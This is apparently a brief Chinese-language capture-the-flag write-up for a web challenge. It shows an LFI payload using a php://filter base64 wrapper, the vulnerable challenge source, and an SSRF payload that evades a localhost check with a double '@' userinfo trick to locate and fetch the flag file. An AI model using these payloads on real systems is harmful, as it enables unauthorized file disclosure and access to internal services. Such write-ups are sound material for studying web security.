### d1v1n6
- 題目有個很明顯的LFI
- payload: `http://pre-exam-web.ais3.org:10103/index.php?path=php://filter/convert.base64-encode/resource=index`
- index.php
```
<?php
    if ($_SERVER['REMOTE_ADDR'] == '127.0.0.1') {
        // show path of the flag
        die($_ENV['FLAG_HINT']);
    }
    if ($path = @$_GET['path']) {
        $path = trim($path);
        if (preg_match('/https?:\/\/([^s\/]+)/i', $path, $g)) {
            // resolve ip address
            $ip = gethostbyname($g[1]);
            // no local request
            if ($ip == '127.0.0.1' || $ip == '0.0.0.0')
                die('Do not request to localhost!');
        }
        // no flag in path
        $path = preg_replace('/flag/i', '', $path);
        if ($content = @file_get_contents($path, FALSE, NULL, 0, 1000)) {
            // no flag in content
            if (preg_match('/flag/i', $content)) 
                die('Dex
```
- 注意到如果`REMOTE_ADDR`是`127.0.0.1`會有FLAG相關的東西
- 於是構造SSRF payload: `http://pre-exam-web.ais3.org:10103/index.php?path=php://filter/convert.base64-encode/resource=http://root@127.0.0.1@127.0.0.1/index.php`
- 得到flag藏在`FLAG_14d65189669f05d206764c9de441474d.txt`檔案裡面 於是再一次LFI
- payload: `http://pre-exam-web.ais3.org:10103/FLAG_14d65189669f05d206764c9de441474d.txt`
- 得到flag